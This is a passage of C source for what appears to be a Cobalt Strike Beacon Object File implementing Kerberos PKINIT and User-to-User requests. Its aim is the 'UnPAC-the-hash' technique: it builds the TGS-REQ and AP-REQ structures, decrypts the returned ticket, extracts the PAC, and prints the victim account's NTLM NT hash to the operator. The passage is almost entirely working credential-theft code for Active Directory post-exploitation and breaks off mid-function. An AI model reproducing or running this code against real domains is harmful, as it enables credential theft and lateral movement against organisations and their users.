    memcpy(authContent + offset, cusecTag, cusecTagLen);
    offset += cusecTagLen;
    free(cusecInt);
    free(cusecTag);

    /* ctime [5] KerberosTime */
    char timeStr[32];
    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    int ctimeLen;
    BYTE* ctime = BuildGeneralizedTime(timeStr, &ctimeLen);
    int ctimeTagLen;
    BYTE* ctimeTag = BuildContextTag(5, ctime, ctimeLen, &ctimeTagLen);
    memcpy(authContent + offset, ctimeTag, ctimeTagLen);
    offset += ctimeTagLen;
    free(ctime);
    free(ctimeTag);

    /* Build Authenticator SEQUENCE */
    int authSeqLen;
    BYTE* authSeq = BuildSequence(authContent, offset, &authSeqLen);
    free(authContent);

    /* Wrap in APPLICATION 2 */
    BYTE* result = BuildApplication(2, authSeq, authSeqLen, outLen);
    free(authSeq);

    return result;
}

/* Build U2U AP-REQ */
static BYTE* BuildU2UApReq(BYTE* ticket, int ticketLen, BYTE* encAuthenticator, int encAuthLen, int* outLen) {
    BYTE* apReqContent = (BYTE*)malloc(ticketLen + encAuthLen + 256);
    int offset = 0;

    /* pvno [0] INTEGER 5 */
    int pvnoLen;
    BYTE* pvno = BuildInteger(5, &pvnoLen);
    int pvnoTagLen;
    BYTE* pvnoTag = BuildContextTag(0, pvno, pvnoLen, &pvnoTagLen);
    memcpy(apReqContent + offset, pvnoTag, pvnoTagLen);
    offset += pvnoTagLen;
    free(pvno);
    free(pvnoTag);

    /* msg-type [1] INTEGER 14 (AP-REQ) */
    int mtLen;
    BYTE* mt = BuildInteger(14, &mtLen);
    int mtTagLen;
    BYTE* mtTag = BuildContextTag(1, mt, mtLen, &mtTagLen);
    memcpy(apReqContent + offset, mtTag, mtTagLen);
    offset += mtTagLen;
    free(mt);
    free(mtTag);

    /* ap-options [2] BIT STRING (no options) */
    BYTE apOptions[] = { 0x00, 0x00, 0x00, 0x00 };
    int apOptBsLen;
    BYTE* apOptBs = BuildBitString(apOptions, 4, &apOptBsLen);
    int apOptTagLen;
    BYTE* apOptTag = BuildContextTag(2, apOptBs, apOptBsLen, &apOptTagLen);
    memcpy(apReqContent + offset, apOptTag, apOptTagLen);
    offset += apOptTagLen;
    free(apOptBs);
    free(apOptTag);

    /* ticket [3] Ticket */
    int ticketTagLen;
    BYTE* ticketTag = BuildContextTag(3, ticket, ticketLen, &ticketTagLen);
    memcpy(apReqContent + offset, ticketTag, ticketTagLen);
    offset += ticketTagLen;
    free(ticketTag);

    /* authenticator [4] EncryptedData */
    static BYTE encDataContent[4096];
    int edOffset = 0;

    /* etype [0] INTEGER 18 (AES256) */
    int etypeLen;
    BYTE* etype = BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1, &etypeLen);
    int etypeTagLen;
    BYTE* etypeTag = BuildContextTag(0, etype, etypeLen, &etypeTagLen);
    memcpy(encDataContent + edOffset, etypeTag, etypeTagLen);
    edOffset += etypeTagLen;
    free(etype);
    free(etypeTag);

    /* cipher [2] OCTET STRING */
    int cipherLen;
    BYTE* cipher = BuildOctetString(encAuthenticator, encAuthLen, &cipherLen);
    int cipherTagLen;
    BYTE* cipherTag = BuildContextTag(2, cipher, cipherLen, &cipherTagLen);
    memcpy(encDataContent + edOffset, cipherTag, cipherTagLen);
    edOffset += cipherTagLen;
    free(cipher);
    free(cipherTag);

    int encDataSeqLen;
    BYTE* encDataSeq = BuildSequence(encDataContent, edOffset, &encDataSeqLen);
    int encDataTagLen;
    BYTE* encDataTag = BuildContextTag(4, encDataSeq, encDataSeqLen, &encDataTagLen);
    memcpy(apReqContent + offset, encDataTag, encDataTagLen);
    offset += encDataTagLen;
    free(encDataSeq);
    free(encDataTag);

    /* Build AP-REQ SEQUENCE */
    int apReqSeqLen;
    BYTE* apReqSeq = BuildSequence(apReqContent, offset, &apReqSeqLen);
    free(apReqContent);

    /* Wrap in APPLICATION 14 */
    BYTE* result = BuildApplication(14, apReqSeq, apReqSeqLen, outLen);
    free(apReqSeq);

    return result;
}

/* Build U2U TGS-REQ */
static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, int ticketLen,
                            BYTE* sessionKey, int sessionKeyLen, int* outLen) {
    BYTE* reqBodyContent = (BYTE*)malloc(4096);
    int rbOffset = 0;

    /* kdc-options [0] BIT STRING - enc-tkt-in-skey flag */
    BYTE kdcOptions[] = { 0x40, 0x81, 0x00, 0x18 };
    int kdcOptBsLen;
    BYTE* kdcOptBs = BuildBitString(kdcOptions, 4, &kdcOptBsLen);
    int kdcOptTagLen;
    BYTE* kdcOptTag = BuildContextTag(0, kdcOptBs, kdcOptBsLen, &kdcOptTagLen);
    memcpy(reqBodyContent + rbOffset, kdcOptTag, kdcOptTagLen);
    rbOffset += kdcOptTagLen;
    free(kdcOptBs);
    free(kdcOptTag);

    /* realm [2] Realm */
    int realmStrLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    int realmTagLen;
    BYTE* realmTag = BuildContextTag(2, realmStr, realmStrLen, &realmTagLen);
    memcpy(reqBodyContent + rbOffset, realmTag, realmTagLen);
    rbOffset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* sname [3] PrincipalName - target is ourselves */
    int snameLen;
    BYTE* sname = BuildPrincipalName(1, user, NULL, &snameLen);
    int snameTagLen;
    BYTE* snameTag = BuildContextTag(3, sname, snameLen, &snameTagLen);
    memcpy(reqBodyContent + rbOffset, snameTag, snameTagLen);
    rbOffset += snameTagLen;
    free(sname);
    free(snameTag);

    /* till [5] KerberosTime */
    SYSTEMTIME st;
    GetSystemTime(&st);
    char tillStr[32];
    sprintf(tillStr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay + 1, st.wHour, st.wMinute, st.wSecond);
    int tillLen;
    BYTE* till = BuildGeneralizedTime(tillStr, &tillLen);
    int tillTagLen;
    BYTE* tillTag = BuildContextTag(5, till, tillLen, &tillTagLen);
    memcpy(reqBodyContent + rbOffset, tillTag, tillTagLen);
    rbOffset += tillTagLen;
    free(till);
    free(tillTag);

    /* nonce [7] UInt32 */
    int nonce = g_nonce + 1;
    int nonceLen;
    BYTE* nonceInt = BuildInteger(nonce, &nonceLen);
    int nonceTagLen;
    BYTE* nonceTag = BuildContextTag(7, nonceInt, nonceLen, &nonceTagLen);
    memcpy(reqBodyContent + rbOffset, nonceTag, nonceTagLen);
    rbOffset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* etype [8] SEQUENCE OF Int32 */
    BYTE etypeContent[32];
    int etOffset = 0;
    int aes256Len;
    BYTE* aes256 = BuildInteger(18, &aes256Len);
    memcpy(etypeContent + etOffset, aes256, aes256Len);
    etOffset += aes256Len;
    free(aes256);

    int etypeSeqLen;
    BYTE* etypeSeq = BuildSequence(etypeContent, etOffset, &etypeSeqLen);
    int etypeTagLen;
    BYTE* etypeTag = BuildContextTag(8, etypeSeq, etypeSeqLen, &etypeTagLen);
    memcpy(reqBodyContent + rbOffset, etypeTag, etypeTagLen);
    rbOffset += etypeTagLen;
    free(etypeSeq);
    free(etypeTag);

    /* additional-tickets [11] SEQUENCE OF Ticket - our TGT for U2U */
    int addTicketsSeqLen;
    BYTE* addTicketsSeq = BuildSequence(ticket, ticketLen, &addTicketsSeqLen);
    int addTicketsTagLen;
    BYTE* addTicketsTag = BuildContextTag(11, addTicketsSeq, addTicketsSeqLen, &addTicketsTagLen);
    memcpy(reqBodyContent + rbOffset, addTicketsTag, addTicketsTagLen);
    rbOffset += addTicketsTagLen;
    free(addTicketsSeq);
    free(addTicketsTag);

    /* Build req-body SEQUENCE */
    int reqBodySeqLen;
    BYTE* reqBodySeq = BuildSequence(reqBodyContent, rbOffset, &reqBodySeqLen);
    free(reqBodyContent);

    /* Build Authenticator with checksum of req-body */
    int authenticatorLen;
    BYTE* authenticator = BuildU2UAuthenticator(user, realm, sessionKey, sessionKeyLen,
                                                 reqBodySeq, reqBodySeqLen, &authenticatorLen);
    if (!authenticator) {
        free(reqBodySeq);
        return NULL;
    }

    /* Encrypt authenticator with session key (key usage 7) */
    int encAuthLen;
    BYTE* encAuth = KerberosEncrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TGS_REQ_AUTH,
                                     sessionKey, sessionKeyLen, authenticator, authenticatorLen, &encAuthLen);
    free(authenticator);

    if (!encAuth) {
        free(reqBodySeq);
        return NULL;
    }

    /* Build AP-REQ */
    int apReqLen;
    BYTE* apReq = BuildU2UApReq(ticket, ticketLen, encAuth, encAuthLen, &apReqLen);
    free(encAuth);

    if (!apReq) {
        free(reqBodySeq);
        return NULL;
    }

    /* Build PA-TGS-REQ (padata-type 1) */
    static BYTE padataContent[4096];
    int paOffset = 0;

    /* padata-type [1] INTEGER 1 */
    int ptLen;
    BYTE* pt = BuildInteger(1, &ptLen);
    int ptTagLen;
    BYTE* ptTag = BuildContextTag(1, pt, ptLen, &ptTagLen);
    memcpy(padataContent + paOffset, ptTag, ptTagLen);
    paOffset += ptTagLen;
    free(pt);
    free(ptTag);

    /* padata-value [2] OCTET STRING (AP-REQ) */
    int pvLen;
    BYTE* pv = BuildOctetString(apReq, apReqLen, &pvLen);
    int pvTagLen;
    BYTE* pvTag = BuildContextTag(2, pv, pvLen, &pvTagLen);
    memcpy(padataContent + paOffset, pvTag, pvTagLen);
    paOffset += pvTagLen;
    free(pv);
    free(pvTag);
    free(apReq);

    int padataSeqLen;
    BYTE* padataSeq = BuildSequence(padataContent, paOffset, &padataSeqLen);

    int padataOuterSeqLen;
    BYTE* padataOuterSeq = BuildSequence(padataSeq, padataSeqLen, &padataOuterSeqLen);
    free(padataSeq);
    int padataTagLen;
    BYTE* padataTag = BuildContextTag(3, padataOuterSeq, padataOuterSeqLen, &padataTagLen);
    free(padataOuterSeq);

    /* Build TGS-REQ */
    static BYTE tgsReqContent[8192];
    int tgsOffset = 0;

    /* pvno [1] INTEGER 5 */
    int pvnoLen;
    BYTE* pvno = BuildInteger(5, &pvnoLen);
    int pvnoTagLen;
    BYTE* pvnoTag = BuildContextTag(1, pvno, pvnoLen, &pvnoTagLen);
    memcpy(tgsReqContent + tgsOffset, pvnoTag, pvnoTagLen);
    tgsOffset += pvnoTagLen;
    free(pvno);
    free(pvnoTag);

    /* msg-type [2] INTEGER 12 (TGS-REQ) */
    int mtLen;
    BYTE* msgType = BuildInteger(12, &mtLen);
    int mtTagLen;
    BYTE* mtTag = BuildContextTag(2, msgType, mtLen, &mtTagLen);
    memcpy(tgsReqContent + tgsOffset, mtTag, mtTagLen);
    tgsOffset += mtTagLen;
    free(msgType);
    free(mtTag);

    /* padata [3] */
    memcpy(tgsReqContent + tgsOffset, padataTag, padataTagLen);
    tgsOffset += padataTagLen;
    free(padataTag);

    /* req-body [4] */
    int reqBodyTagLen;
    BYTE* reqBodyTag = BuildContextTag(4, reqBodySeq, reqBodySeqLen, &reqBodyTagLen);
    memcpy(tgsReqContent + tgsOffset, reqBodyTag, reqBodyTagLen);
    tgsOffset += reqBodyTagLen;
    free(reqBodyTag);
    free(reqBodySeq);

    /* Build TGS-REQ SEQUENCE */
    int tgsReqSeqLen;
    BYTE* tgsReqSeq = BuildSequence(tgsReqContent, tgsOffset, &tgsReqSeqLen);

    /* Wrap in APPLICATION 12 */
    BYTE* result = BuildApplication(12, tgsReqSeq, tgsReqSeqLen, outLen);
    free(tgsReqSeq);

    return result;
}

/*
 * =============================================================================
 * U2U - TGS-REP Processing
 * =============================================================================
 */

/* Extract ticket enc-part cipher from TGS-REP ticket */
static BYTE* ExtractTicketEncPartFromTgsRep(BYTE* tgsRep, int tgsRepLen, int* cipherLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 13 */
    if (tgsRep[offset] == 0x6D) {
        offset++;
        offset += DecodeLength(tgsRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (tgsRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(tgsRep, offset, &length);
    }

    /* Find ticket [5] */
    while (offset < tgsRepLen - 10) {
        if (tgsRep[offset] == 0xA5) {
            offset++;
            offset += DecodeLength(tgsRep, offset, &length);
            int ticketEnd = offset + length;

            /* Skip APPLICATION 1 if present */
            if (tgsRep[offset] == 0x61) {
                offset++;
                offset += DecodeLength(tgsRep, offset, &length);
            }

            /* Skip SEQUENCE */
            if (tgsRep[offset] == 0x30) {
                offset++;
                offset += DecodeLength(tgsRep, offset, &length);
            }

            /* Find enc-part [3] in ticket */
            while (offset < ticketEnd - 10) {
                if (tgsRep[offset] == 0xA3) {
                    offset++;
                    offset += DecodeLength(tgsRep, offset, &length);

                    /* EncryptedData SEQUENCE */
                    if (tgsRep[offset] == 0x30) {
                        offset++;
                        int encDataLen;
                        offset += DecodeLength(tgsRep, offset, &encDataLen);
                        int encDataEnd = offset + encDataLen;

                        /* Find cipher [2] */
                        while (offset < encDataEnd) {
                            if (tgsRep[offset] == 0xA2) {
                                offset++;
                                offset += DecodeLength(tgsRep, offset, &length);
                                if (tgsRep[offset] == 0x04) {
                                    offset++;
                                    offset += DecodeLength(tgsRep, offset, cipherLen);
                                    BYTE* cipherData = (BYTE*)malloc(*cipherLen);
                                    memcpy(cipherData, tgsRep + offset, *cipherLen);
                                    return cipherData;
                                }
                            } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                                offset++;
                                int skipLen;
                                offset += DecodeLength(tgsRep, offset, &skipLen);
                                offset += skipLen;
                            } else {
                                offset++;
                            }
                        }
                    }
                    break;
                } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(tgsRep, offset, &skipLen);
                    offset += skipLen;
                } else {
                    offset++;
                }
            }
            break;
        } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(tgsRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    *cipherLen = 0;
    return NULL;
}

/* Extract PAC from EncTicketPart authorization-data */
static BYTE* ExtractPacFromEncTicketPart(BYTE* encTicketPart, int encTicketPartLen, int* pacLen);

/* Recursive extraction of PAC from AuthorizationData */
static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen) {
    int offset = 0;
    int length;

    /* Skip SEQUENCE if present */
    if (authData[offset] == 0x30) {
        offset++;
        offset += DecodeLength(authData, offset, &length);
    }

    while (offset < authDataLen - 5) {
        if (authData[offset] == 0x30) {
            offset++;
            int elemLen;
            offset += DecodeLength(authData, offset, &elemLen);
            int elemEnd = offset + elemLen;

            int adType = -1;
            BYTE* adData = NULL;
            int adDataLen = 0;

            while (offset < elemEnd) {
                if (authData[offset] == 0xA0) { /* ad-type [0] */
                    offset++;
                    offset += DecodeLength(authData, offset, &length);
                    if (authData[offset] == 0x02) {
                        offset++;
                        int intLen = authData[offset++];
                        adType = 0;
                        int i;
                        for (i = 0; i < intLen; i++) {
                            adType = (adType << 8) | authData[offset++];
                        }
                    }
                } else if (authData[offset] == 0xA1) { /* ad-data [1] */
                    offset++;
                    offset += DecodeLength(authData, offset, &length);
                    if (authData[offset] == 0x04) {
                        offset++;
                        offset += DecodeLength(authData, offset, &adDataLen);
                        adData = authData + offset;
                        offset += adDataLen;
                    }
                } else {
                    offset++;
                }
            }

            if (adType == 1 && adData) { /* AD-IF-RELEVANT - recurse */
                BYTE* result = ExtractPacFromAuthData(adData, adDataLen, pacLen);
                if (result) return result;
            } else if (adType == 128 && adData) { /* PAC */
                BYTE* result = (BYTE*)malloc(adDataLen);
                memcpy(result, adData, adDataLen);
                *pacLen = adDataLen;
                return result;
            }

            offset = elemEnd;
        } else {
            offset++;
        }
    }

    *pacLen = 0;
    return NULL;
}

static BYTE* ExtractPacFromEncTicketPart(BYTE* encTicketPart, int encTicketPartLen, int* pacLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 3 if present */
    if (encTicketPart[offset] == 0x63) {
        offset++;
        offset += DecodeLength(encTicketPart, offset, &length);
    }

    /* Skip SEQUENCE */
    if (encTicketPart[offset] == 0x30) {
        offset++;
        offset += DecodeLength(encTicketPart, offset, &length);
    }

    /* Find authorization-data [10] */
    while (offset < encTicketPartLen - 10) {
        if (encTicketPart[offset] == 0xAA) {
            offset++;
            int authDataLen;
            offset += DecodeLength(encTicketPart, offset, &authDataLen);
            return ExtractPacFromAuthData(encTicketPart + offset, authDataLen, pacLen);
        } else if ((encTicketPart[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(encTicketPart, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    *pacLen = 0;
    return NULL;
}

/* Parse PAC structure and extract PAC_CREDENTIAL_INFO */
static void ParsePacAndExtractNtHash(BYTE* pac, int pacLen, BYTE* replyKey, int replyKeyLen) {
    DWORD cBuffers;
    int offset;
    DWORD i;

    if (pacLen < 8) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PAC too small");
        return;
    }

    cBuffers = *(DWORD*)pac;

    offset = 8;
    for (i = 0; i < cBuffers && offset + 16 <= pacLen; i++) {
        DWORD ulType = *(DWORD*)(pac + offset);
        DWORD cbBufferSize = *(DWORD*)(pac + offset + 4);
        ULONGLONG bufferOffset = *(ULONGLONG*)(pac + offset + 8);

        /* Type 2 = PAC_CREDENTIAL_INFO */
        if (ulType == 2 && bufferOffset + cbBufferSize <= (ULONGLONG)pacLen) {
            BYTE* credInfo = pac + bufferOffset;
            DWORD encType;
            BYTE* encData;
            int encDataLen;
            int decLen;
            BYTE* decrypted;

            if (cbBufferSize < 8) {
                offset += 16;
                continue;
            }

            encType = *(DWORD*)(credInfo + 4);
            encData = credInfo + 8;
            encDataLen = cbBufferSize - 8;

            /* Decrypt with AS reply key (key usage 16) */
            decrypted = KerberosDecrypt(encType, KRB_KEY_USAGE_PAC_CREDENTIAL,
                                        replyKey, replyKeyLen, encData, encDataLen, &decLen);

            if (decrypted) {
                ParsePacCredentialData(decrypted, decLen);
                free(decrypted);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PAC_CREDENTIAL_INFO");
            }
        }

        offset += 16;
    }
}

/* Process TGS-REP and extract NT hash */
static void ProcessTgsRep(BYTE* tgsRep, int tgsRepLen, BYTE* sessionKey, int sessionKeyLen,
                          BYTE* replyKey, int replyKeyLen) {
    int ticketEncPartLen;
    BYTE* ticketEncPart;
    int decTicketLen;
    BYTE* decTicket;
    int pacLen;
    BYTE* pac;

    /* Check message type */
    if (tgsRep[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconPrintf(CALLBACK_OUTPUT, "[!] U2U TGS-REQ returned KRB-ERROR");
        return;
    }

    if (tgsRep[0] != 0x6D) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected TGS response type: 0x%02X", tgsRep[0]);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] U2U TGS-REP received");

    /* Extract ticket enc-part */
    ticketEncPart = ExtractTicketEncPartFromTgsRep(tgsRep, tgsRepLen, &ticketEncPartLen);
    if (!ticketEncPart) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract ticket enc-part from TGS-REP");
        return;
    }

    /* Decrypt with session key (key usage 2 for U2U ticket enc-part) */
    decTicket = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TICKET_ENCPART,
                                sessionKey, sessionKeyLen, ticketEncPart, ticketEncPartLen, &decTicketLen);
    free(ticketEncPart);

    if (!decTicket) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt ticket enc-part");
        return;
    }

    /* Extract PAC from authorization-data */
    pac = ExtractPacFromEncTicketPart(decTicket, decTicketLen, &pacLen);
    free(decTicket);

    if (!pac) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract PAC from EncTicketPart");
        return;
    }

    /* Parse PAC and extract NT hash */
    ParsePacAndExtractNtHash(pac, pacLen, replyKey, replyKeyLen);
    free(pac);
}

/* Perform U2U TGS-REQ to extract NT hash */
static void PerformU2U(const char* kdcHost, const char* user, const char* realm,
                       BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
                       BYTE* replyKey, int replyKeyLen) {
    int tgsReqLen;
    BYTE* tgsReq;
    int tgsRepLen;
    BYTE* tgsRep;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Performing U2U TGS-REQ for NT hash extraction...");

    /* Build TGS-REQ */
    tgsReq = BuildU2UTgsReq(user, realm, ticket, ticketLen, sessionKey, sessionKeyLen, &tgsReqLen);
    if (!tgsReq) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build U2U TGS-REQ");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending U2U TGS-REQ (%d bytes)...", tgsReqLen);

    /* Send to KDC */
    tgsRep = SendToKdc(kdcHost, 88, tgsReq, tgsReqLen, &tgsRepLen);
    free(tgsReq);

    if (!tgsRep) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to send TGS-REQ to KDC");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Received TGS-REP (%d bytes)", tgsRepLen);

    /* Process TGS-REP */
    ProcessTgsRep(tgsRep, tgsRepLen, sessionKey, sessionKeyLen, replyKey, replyKeyLen);
    free(tgsRep);
}

/*
 * =============================================================================
 * Extract PA-PAC-CREDENTIALS from AS-REP
 * =============================================================================
 */

static BYTE* ExtractPaPacCredentials(BYTE* asRep, int asRepLen, int* outLen) {
    int i;
    *outLen = 0;

    /* Look for PA-DATA type 167 (PA-PAC-CREDENTIALS) */
    for (i = 0; i < asRepLen - 20; i++) {
        if (asRep[i] == 0x30 && asRep[i+2] == 0xA1) { /* SEQUENCE { padata-type [1] */
            int j;
            for (j = i; j < i + 20 && j < asRepLen - 5; j++) {
                if (asRep[j] == 0x02) { /* INTEGER */
                    int intLen = asRep[j+1];
                    int value = 0;
                    int k;
                    for (k = 0; k < intLen; k++) {
                        value = (value << 8) | asRep[j+2+k];
                    }

                    if (value == PA_PAC_CREDENTIALS) {
                        /* Found PA-PAC-CREDENTIALS, find the OCTET STRING */
                        int m;
                        for (m = j + 2 + intLen; m < asRepLen - 5; m++) {
                            if (asRep[m] == 0xA2) { /* [2] padata-value */
                                int padataLen;
                                int padataLenBytes = DecodeLength(asRep, m+1, &padataLen);
                                int octetStart = m + 1 + padataLenBytes;

                                if (asRep[octetStart] == 0x04) {
                                    int credLen;
                                    int credLenBytes = DecodeLength(asRep, octetStart+1, &credLen);

                                    *outLen = credLen;
                                    BYTE* cred = (BYTE*)malloc(credLen);
                                    memcpy(cred, asRep + octetStart + 1 + credLenBytes, credLen);
                                    return cred;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    return NULL;
}

/*
 * =============================================================================
 * Parse PAC_CREDENTIAL_DATA to extract NT hash
 * =============================================================================
 */

static void ParsePacCredentialData(BYTE* data, int dataLen) {
    /*
     * PAC_CREDENTIAL_DATA is NDR encoded:
     * - CredentialCount (4 bytes)
     * - Array of SECPKG_SUPPLEMENTAL_CRED containing:
     *   - PackageName (Unicode "NTLM")
     *   - Credentials = NTLM_SUPPLEMENTAL_CREDENTIAL:
     *     - Version (4 bytes) = 0
     *     - Flags (4 bytes)
     *     - LmPassword (16 bytes)
     *     - NtPassword (16 bytes)
     */
    int i, j;

    if (dataLen < 8) {
        return;
    }

    /* Method 1: Search for "NTLM" string (Unicode: 'N' 00 'T' 00 'L' 00 'M' 00) */
    for (i = 0; i < dataLen - 50; i++) {
        if (data[i] == 'N' && data[i+1] == 0 &&
            data[i+2] == 'T' && data[i+3] == 0 &&
            data[i+4] == 'L' && data[i+5] == 0 &&
            data[i+6] == 'M' && data[i+7] == 0) {

            /*
             * NTLM_SUPPLEMENTAL_CREDENTIAL follows after package name + padding
             * Structure: Version (4), Flags (4), LmPassword (16), NtPassword (16)
             */
            for (j = i + 8; j < dataLen - 40; j++) {
                /* Look for Version=0 and reasonable Flags */
                if (*(DWORD*)(data + j) == 0) {
                    DWORD flags = *(DWORD*)(data + j + 4);
                    /* Common flags: 0x01 (NtPresent), 0x02 (LmPresent), etc */
                    if (flags > 0 && flags < 0x100) {
                        BYTE* lmHash = data + j + 8;
                        BYTE* ntHash = data + j + 24;

                        /* Check if NT hash looks valid (not all zeros) */
                        int hasData = 0;
                        int k;
                        for (k = 0; k < 16; k++) {
                            if (ntHash[k] != 0) hasData = 1;
                        }

                        if (hasData) {
                            BeaconPrintf(CALLBACK_OUTPUT, "[+] NT Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                ntHash[0], ntHash[1], ntHash[2], ntHash[3],
                                ntHash[4], ntHash[5], ntHash[6], ntHash[7],
                                ntHash[8], ntHash[9], ntHash[10], ntHash[11],
                                ntHash[12], ntHash[13], ntHash[14], ntHash[15]);
                            return;
                        }
                    }
                }
            }
        }
    }

    /* Method 2: Direct scan at common NDR offsets */
    int offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70};
    for (j = 0; j < 10; j++) {
        int off = offsets[j];
        if (off + 40 <= dataLen) {
            if (*(DWORD*)(data + off) == 0) {  /* Version = 0 */
                DWORD flags = *(DWORD*)(data + off + 4);
                if (flags > 0 && flags < 0x100) {
                    BYTE* ntHash = data + off + 24;

                    int hasData = 0;
                    int k;
                    for (k = 0; k < 16; k++) {
                        if (ntHash[k] != 0) hasData = 1;
                    }

                    if (hasData) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] NT Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                            ntHash[0], ntHash[1], ntHash[2], ntHash[3],
                            ntHash[4], ntHash[5], ntHash[6], ntHash[7],
                            ntHash[8], ntHash[9], ntHash[10], ntHash[11],
                            ntHash[12], ntHash[13], ntHash[14], ntHash[15]);
                        return;
                    }
                }
            }
        }
    }

    /* Fallback: could not parse */
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not parse NT hash from PAC_CREDENTIAL_DATA");
}

/*
 * =============================================================================
 * Kerberos Error Descriptions
 * =============================================================================
 */

static const char* GetKrbErrorDesc(int code) {
    switch (code) {
        case 6:  return "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found";
        case 7:  return "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found";
        case 14: return "KDC_ERR_ETYPE_NOSUPP - Encryption type not supported";
        case 18: return "KDC_ERR_CLIENT_REVOKED - Client credentials revoked";
        case 24: return "KDC_ERR_PREAUTH_FAILED - Pre-authentication failed";
        case 25: return "KDC_ERR_PREAUTH_REQUIRED - Pre-authentication required";
        case 29: return "KDC_ERR_SVC_UNAVAILABLE - Service unavailable";
        case 37: return "KRB_AP_ERR_SKEW - Clock skew too great";
        case 68: return "KDC_ERR_WRONG_REALM - Wrong realm";
        default: return "Unknown error";
    }
}

/*
 * =============================================================================
 * Process AS-REP - Main PKINIT Response Handler
 * =============================================================================
 */

static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
                         const char* user, const char* realm, const char* kdcHost) {
    int i;
    int kdcPubKeyLen, serverNonceLen, encPartLen, decryptedLen, sessionKeyLen, sessionKeyType;
    BYTE* kdcPubKey;
    BYTE* serverNonce;
    BYTE* encPart;
    BYTE* decrypted;
    BYTE* sessionKey;
    BigInt p, y, x, sharedSecret;
    BYTE sharedSecretBytes[128];
    BYTE replyKey[32];

    /* Check message type */
    if (asRep[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Received KRB-ERROR");
        int errCode = -1;
        for (i = 0; i < asRepLen - 5; i++) {
            if (asRep[i] == 0xA6 && asRep[i+2] == 0x02) {
                errCode = 0;
                int errLen = asRep[i+3];
                int j;
                for (j = 0; j < errLen; j++) {
                    errCode = (errCode << 8) | asRep[i+4+j];
                }
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Error code: %d (0x%X)", errCode, errCode);
                BeaconPrintf(CALLBACK_OUTPUT, "[!] %s", GetKrbErrorDesc(errCode));
                break;
            }
        }
        return;
    }

    if (asRep[0] != 0x6B) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected response type: 0x%02X", asRep[0]);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT obtained!");

    /* Step 1: Extract KDC's DH public key */
    kdcPubKey = ExtractKdcDhPublicKey(asRep, asRepLen, &kdcPubKeyLen);
    if (!kdcPubKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract KDC DH public key");
        return;
    }

    /* Step 2: Extract server DH nonce (optional) */
    serverNonce = ExtractServerDhNonce(asRep, asRepLen, &serverNonceLen);

    /* Step 3: Compute DH shared secret: KDC_pubkey^our_privkey mod p */
    bigint_from_bytes(&p, DH_P_MODP2, sizeof(DH_P_MODP2));
    bigint_from_bytes(&y, kdcPubKey, kdcPubKeyLen);
    bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));
    bigint_modpow(&sharedSecret, &y, &x, &p);
    bigint_to_bytes(&sharedSecret, sharedSecretBytes, 128);

    /* Step 4: Derive reply key using kTruncate (32 bytes for AES256) */
    DeriveSessionKey(sharedSecretBytes, 128, serverNonce, serverNonceLen, replyKey, 32);
    memcpy(g_replyKey, replyKey, 32);

    /* Step 5: Extract and decrypt enc-part */
    encPart = ExtractEncPartFromAsRep(asRep, asRepLen, &encPartLen);
    if (!encPart) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract enc-part");
        free(kdcPubKey);
